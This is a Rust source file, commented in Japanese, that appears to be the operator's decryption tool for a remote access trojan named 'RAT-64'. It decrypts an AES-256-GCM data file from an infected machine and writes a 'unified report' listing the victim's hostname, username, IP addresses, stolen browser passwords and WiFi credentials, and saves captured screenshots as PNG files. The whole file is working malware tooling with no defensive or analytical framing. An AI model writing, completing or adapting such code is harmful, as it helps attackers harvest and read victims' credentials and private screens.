// RAT-64 データ復号化ツール
use std::env;
use std::fs;
use std::path::Path;

use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit, Nonce};
use base64::{engine::general_purpose::STANDARD_NO_PAD, Engine};
use rmp_serde::decode::from_slice as from_msgpack_slice;

// データ構造体のインポート
use rat_64::{IntegratedPayload, ScreenshotData};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();

    // 使用方法: decrypt.exe <key_base64> <nonce_base64> [data_file]
    if args.len() < 3 {
        print_usage();
        return Ok(());
    }

    // ヘルプオプションのチェック
    if args[1] == "--help" || args[1] == "-h" {
        print_usage();
        return Ok(());
    }

    // 引数からキーとナンスを取得
    let key_str = &args[1];
    let nonce_str = &args[2];
    let data_file = if args.len() > 3 { &args[3] } else { "data.dat" };

    println!("RAT-64 Data Decryption Tool");
    println!("Target file: {}", data_file);

    // Base64デコード (パディングなし形式)
    println!("Decoding Base64 key and nonce...");
    let key = STANDARD_NO_PAD
        .decode(key_str)
        .map_err(|e| format!("Invalid key Base64: {}", e))?;
    let nonce = STANDARD_NO_PAD
        .decode(nonce_str)
        .map_err(|e| format!("Invalid nonce Base64: {}", e))?;

    // キーとナンスの長さを検証
    println!("Key length: {} bytes", key.len());
    println!("Nonce length: {} bytes", nonce.len());

    if key.len() != 32 {
        return Err(format!("Invalid key length: {} (expected 32 bytes)", key.len()).into());
    }

    if nonce.len() != 12 {
        return Err(format!("Invalid nonce length: {} (expected 12 bytes)", nonce.len()).into());
    }

    println!("Key and nonce validation successful");

    let key_array: [u8; 32] = key.try_into().map_err(|_| "Key array conversion failed")?;
    let nonce_array: [u8; 12] = nonce
        .try_into()
        .map_err(|_| "Nonce array conversion failed")?;

    // 復号化と保存
    decrypt_and_save(data_file, &key_array, &nonce_array)?;

    Ok(())
}

fn print_usage() {
    println!("RAT-64 Data Decryption Tool");
    println!();
    println!("Usage:");
    println!("  decrypt.exe <key_base64> <nonce_base64> [data_file]");
    println!("  decrypt.exe --help | -h");
    println!();
    println!("Arguments:");
    println!("  <key_base64>    - AES-256 key encoded in Base64 (32 bytes)");
    println!("  <nonce_base64>  - Nonce encoded in Base64 (12 bytes)");
    println!("  [data_file]     - Data file to decrypt (default: data.dat)");
    println!();
    println!("Examples:");
    println!("  decrypt.exe dGVzdGtleTEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI= dGVzdG5vbmNlMTIz");
    println!("  decrypt.exe dGVzdGtleTEyMzQ1Njc4OTAxMjM0NTY3ODkwMTI= dGVzdG5vbmNlMTIz backup.dat");
    println!();
    println!("Note: All decrypted data will be combined into a single unified report file.");
}

fn decrypt_and_save(
    data_file: &str,
    key: &[u8; 32],
    nonce: &[u8; 12],
) -> Result<(), Box<dyn std::error::Error>> {
    println!("Decrypting data...");

    if !Path::new(data_file).exists() {
        return Err(format!("Data file '{}' not found", data_file).into());
    }

    // 暗号化されたデータを読み込み
    let encrypted_data = fs::read(data_file)?;
    println!("Encrypted data size: {} bytes", encrypted_data.len());

    // 復号化
    println!("Creating AES-256-GCM cipher...");
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| format!("Invalid key: {}", e))?;
    let nonce_gcm = Nonce::from_slice(nonce);

    println!("Attempting decryption...");
    let decrypted_data = cipher
        .decrypt(nonce_gcm, encrypted_data.as_slice())
        .map_err(|e| format!("Decryption failed: {}", e))?;

    println!("Decryption successful!");

    // MessagePackデータをデシリアライズ
    let full_data: IntegratedPayload = from_msgpack_slice(&decrypted_data)
        .map_err(|e| format!("MessagePack deserialization failed: {}", e))?;

    println!("Parsing data structure...");

    // 出力ファイル名を生成
    let base_name = Path::new(data_file).file_stem().unwrap().to_str().unwrap();
    let output_dir = format!("{}_decrypted", base_name);

    // 出力ディレクトリを作成
    fs::create_dir_all(&output_dir)?;

    // JSONシステム情報を保存
    let json_output = serde_json::to_string_pretty(&full_data.system_info)?;
    fs::write(format!("{}/system_info.json", output_dir), json_output)?;

    // スクリーンショットデータを保存
    if let Some(ref screenshot_data) = full_data.screenshot_data {
        save_screenshot_data(&output_dir, screenshot_data)?;
    }

    // 統合レポートファイルを作成
    create_unified_report(&output_dir, &full_data)?;

    println!("🎉 All data saved to directory: {}/", output_dir);
    println!();
    println!("📁 Generated files:");
    println!("  - system_info.json        (System information in JSON)");
    println!("  - unified_report.txt      (All text data in one file)");
    println!("  - screenshots/            (Screenshot PNG files)");

    Ok(())
}

fn create_unified_report(
    output_dir: &str,
    full_data: &IntegratedPayload,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut report = String::new();

    report.push_str("===============================================\n");
    report.push_str("         RAT-64 UNIFIED DECRYPTION REPORT\n");
    report.push_str("===============================================\n\n");

    report.push_str("SYSTEM INFORMATION\n");
    report.push_str("===============================================\n");
    report.push_str(&format!("Hostname: {}\n", full_data.system_info.hostname));
    report.push_str(&format!("Username: {}\n", full_data.system_info.username));
    report.push_str(&format!("OS: {}\n", full_data.system_info.os_name));
    report.push_str(&format!("Version: {}\n", full_data.system_info.os_version));
    report.push_str(&format!(
        "Architecture: {}\n",
        full_data.system_info.os_arch
    ));
    report.push_str(&format!("CPU: {}\n", full_data.system_info.cpu_info));
    report.push_str(&format!(
        "Memory (Total): {:.2} GB\n",
        full_data.system_info.memory_total_gb
    ));
    report.push_str(&format!(
        "Memory (Available): {:.2} GB\n",
        full_data.system_info.memory_available_gb
    ));
    report.push_str(&format!("Local IP: {}\n", full_data.system_info.local_ip));
    if let Some(public_ip) = &full_data.system_info.public_ip {
        report.push_str(&format!("Public IP: {}\n", public_ip));
    }
    report.push_str(&format!("Timezone: {}\n", full_data.system_info.timezone));
    report.push_str(&format!("Locale: {}\n", full_data.system_info.locale));
    let vm_text = if full_data.system_info.is_virtual_machine {
        match &full_data.system_info.virtual_machine_vendor {
            Some(v) if !v.is_empty() => format!("{}", v),
            _ => "Yes".to_string(),
        }
    } else {
        "No".to_string()
    };
    report.push_str(&format!("Virtual machine: {}\n", vm_text));
    report.push_str(&format!(
        "Uptime: {:.2} hours\n",
        full_data.system_info.uptime_hours
    ));
    report.push('\n');

    report.push_str("AUTHENTICATION DATA\n");
    report.push_str("===============================================\n");

    if !full_data.auth_data.passwords.is_empty() {
        report.push_str(&format!(
            "BROWSER PASSWORDS ({} entries)\n",
            full_data.auth_data.passwords.len()
        ));
        report.push_str("-----------------------------------------------\n");
        for (i, password) in full_data.auth_data.passwords.iter().enumerate() {
            report.push_str(&format!("{}. {}\n", i + 1, password));
        }
        report.push('\n');
    } else {
        report.push_str("BROWSER PASSWORDS: No entries found\n\n");
    }

    if !full_data.auth_data.wifi_creds.is_empty() {
        report.push_str(&format!(
            "WIFI CREDENTIALS ({} entries)\n",
            full_data.auth_data.wifi_creds.len()
        ));
        report.push_str("-----------------------------------------------\n");
        for (i, wifi_cred) in full_data.auth_data.wifi_creds.iter().enumerate() {
            report.push_str(&format!("{}. {}\n", i + 1, wifi_cred));
        }
        report.push('\n');
    } else {
        report.push_str("WIFI CREDENTIALS: No entries found\n\n");
    }

    report.push_str("SCREENSHOT INFORMATION\n");
    report.push_str("===============================================\n");
    if let Some(ref screenshot_data) = full_data.screenshot_data {
        report.push_str(&format!("Capture time: {}\n", screenshot_data.capture_time));
        report.push_str(&format!(
            "Total displays: {}\n",
            screenshot_data.total_count
        ));
        report.push_str(&format!(
            "Primary display: {}\n",
            if screenshot_data.primary_display.is_some() {
                "Available"
            } else {
                "Not available"
            }
        ));
        report.push_str(&format!(
            "All displays captured: {}\n",
            screenshot_data.all_displays.len()
        ));
        report.push_str("Note: Screenshots are saved as PNG files in screenshots/ directory\n");
    } else {
        report.push_str("No screenshot data available\n");
    }
    report.push('\n');

    report.push_str("DATA SUMMARY\n");
    report.push_str("===============================================\n");
    report.push_str(&format!(
        "Total browser passwords: {}\n",
        full_data.auth_data.passwords.len()
    ));
    report.push_str(&format!(
        "Total WiFi credentials: {}\n",
        full_data.auth_data.wifi_creds.len()
    ));
    report.push_str(&format!(
        "Total screenshots: {}\n",
        full_data
            .screenshot_data
            .as_ref()
            .map(|s| s.total_count)
            .unwrap_or(0)
    ));
    report.push_str("System information: Complete\n");
    report.push('\n');

    report.push_str("===============================================\n");
    report.push_str("Report generated by RAT-64 Decryption Tool\n");
    report.push_str("All sensitive data combined in this unified report\n");
    report.push_str("===============================================\n");

    fs::write(format!("{}/unified_report.txt", output_dir), report)?;

    Ok(())
}

fn save_screenshot_data(
    output_dir: &str,
    screenshot_data: &ScreenshotData,
) -> Result<(), Box<dyn std::error::Error>> {
    let screenshot_dir = format!("{}/screenshots", output_dir);
    fs::create_dir_all(&screenshot_dir)?;

    if let Some(primary_screenshot) = &screenshot_data.primary_display {
        save_screenshot_base64(
            primary_screenshot,
            &format!("{}/primary_display.png", screenshot_dir),
        )?;
    }

    for (i, screenshot) in screenshot_data.all_displays.iter().enumerate() {
        save_screenshot_base64(
            screenshot,
            &format!("{}/display_{}.png", screenshot_dir, i + 1),
        )?;
    }

    let mut info_content = String::new();
    info_content.push_str("=== SCREENSHOT INFORMATION ===\n");
    info_content.push_str(&format!("Capture time: {}\n", screenshot_data.capture_time));
    info_content.push_str(&format!(
        "Total displays: {}\n",
        screenshot_data.total_count
    ));
    info_content.push_str(&format!(
        "Primary display: {}\n",
        if screenshot_data.primary_display.is_some() {
            "Available"
        } else {
            "Not available"
        }
    ));
    info_content.push_str(&format!(
        "All displays captured: {}\n",
        screenshot_data.all_displays.len()
    ));

    fs::write(format!("{}/screenshot_info.txt", output_dir), info_content)?;

    Ok(())
}

fn save_screenshot_base64(
    base64_data: &str,
    filename: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    if base64_data.is_empty() {
        return Err("Empty screenshot data".into());
    }

    // スクリーンショットは通常のBase64エンコード（パディング付き）を使用
    let image_data = base64::engine::general_purpose::STANDARD.decode(base64_data)?;
    fs::write(filename, image_data)?;

    Ok(())
}
